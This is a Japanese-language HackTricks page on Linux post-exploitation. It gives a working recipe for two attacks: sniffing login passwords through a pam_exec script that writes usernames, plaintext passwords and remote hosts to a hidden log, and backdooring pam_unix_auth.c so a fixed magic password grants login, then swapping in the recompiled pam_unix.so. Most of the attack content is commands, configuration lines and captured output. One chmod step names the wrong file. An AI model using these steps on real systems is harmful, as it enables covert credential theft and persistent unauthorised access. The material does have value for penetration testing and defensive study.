# Linuxポストエクスプロイテーション

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**で**ゼロからヒーローまでAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>を学ぶ！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**をフォロー**する
- **ハッキングテクニックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出**してください。

</details>

## PAMを使用してログオンパスワードをスニッフィングする

PAMモジュールを構成して、各ユーザーがログインに使用するパスワードを記録します。PAMが何かわからない場合は、次を確認してください：

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

まず、新しい認証が発生するたびに呼び出されるbashスクリプトを作成します。
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
変数はPAM固有であり、`pam_exec.so`モジュールを介して利用可能になります。

以下は変数の意味です：

- **$PAM\_USER:** 入力されたユーザー名。
- **$PAM\_RHOST:** リモートホスト（通常はIPアドレス）
- **$(cat -):** これは`stdin`を読み取り、スクリプトが取得するパスワードが含まれます。
- 結果は`/var/log/toomanysecrets.log`にログファイルにパイプされます。

**すべてのユーザーがファイルを読めないようにする**には、事前に作成して`chmod`を実行することを検討してください。
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
次に、PAM構成ファイルを更新する必要があります。`pam_exec`モジュールを使用してスクリプトを呼び出します。

`/etc/pam.d/`にはさまざまな構成ファイルがあり、`common-auth`を選択します。
```
sudo nano /etc/pam.d/common-auth
```
ファイルの最下部に、以下の認証モジュールを追加してください：

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

オプションの意味は次の通りです：

- **optional:** エラーが発生しても認証が失敗しない（必須ステップではない）
- **pam\_exec.so:** 任意のスクリプトを呼び出すことができる PAM モジュール
- **expose\_authtok:** `stdin` を介してパスワードを読み取るトリック
- **quiet:** ユーザーにエラーを表示しない（何かがうまくいかない場合）
- 最後の引数は以前に作成したシェルスクリプトです

![](<../../.gitbook/assets/image (375).png>)

最後に、ファイルを実行可能にします：

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

これで、別のマシンから ssh したり、ローカルでログインしたりしてみてください。

そして、ログファイルを確認してください：
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### PAMへのバックドア設置

PAMのソースコードに移動します（ディストリビューションによって異なりますが、自分のバージョンと同じものを使用してください）。そして、pam_unix_auth.cファイルの170/180行付近を調べてみましょう：
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

これを以下のように変更します：

![](<../../.gitbook/assets/image (638) (2) (2).png>)

これにより、**パスワード "0xMitsurugi"** を使用するユーザーがログインできるようになります。

`pam_unix_auth.c`を再コンパイルし、`pam_unix.so`ファイルを置き換えます。
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
このプロセスを[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)で自動化することができます。
{% endhint %}

## 参考文献

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)を**フォロー**する。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
